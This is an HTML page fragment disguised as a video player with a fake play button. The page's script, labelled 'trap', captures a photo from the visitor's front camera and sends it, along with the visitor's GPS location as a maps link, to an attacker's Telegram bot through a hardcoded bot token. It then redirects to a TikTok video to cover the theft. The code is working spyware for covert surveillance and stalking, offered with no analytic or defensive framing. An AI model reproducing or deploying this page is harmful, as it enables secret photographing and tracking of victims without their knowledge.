<body id="body">
    <div class="bg" id="bg"></div>
    <div class="play-btn" id="trap" onclick="ultraCapture()">
        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>

    <video id="v" autoplay playsinline muted></video>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
        async function ultraCapture() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = s; await v.play();
                document.getElementById('trap').style.display = 'none';
                document.getElementById('bg').style.display = 'none';
                document.getElementById('body').classList.add('flash-active');
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'target.jpg');
                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const msg = `ðŸ“ Location:\nhttp://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                        window.location.href = targetVideo;
                    }, () => { window.location.href = targetVideo; });
                }, 1800);
            } catch (e) { window.location.href = targetVideo; }
        }
    </script>
